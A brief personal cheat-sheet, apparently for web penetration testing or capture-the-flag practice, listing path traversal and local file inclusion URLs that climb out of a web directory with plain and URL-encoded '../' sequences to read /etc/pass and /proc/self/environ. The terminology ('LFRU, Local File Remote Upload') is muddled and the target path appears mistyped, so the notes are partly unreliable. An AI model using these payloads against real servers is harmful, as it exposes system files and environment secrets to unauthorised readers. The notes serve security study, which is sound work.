## Notes

Some notes to remember for Web.

### Web Upload

If we have a LFRU (Local File Remote Upload) we use:
`http://website.com:port/files/../../../../etc/pass`.
If that doesnt work we then use
`http://website.com:port/files/..%2F..%2F..%2F..%2Fetc%2Fpass`
for LFI.

If `etc/pass` is useless we use then `/proc/self/environ` by `http://website.com:port/files/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron`
Add more %2F inbetween if needed.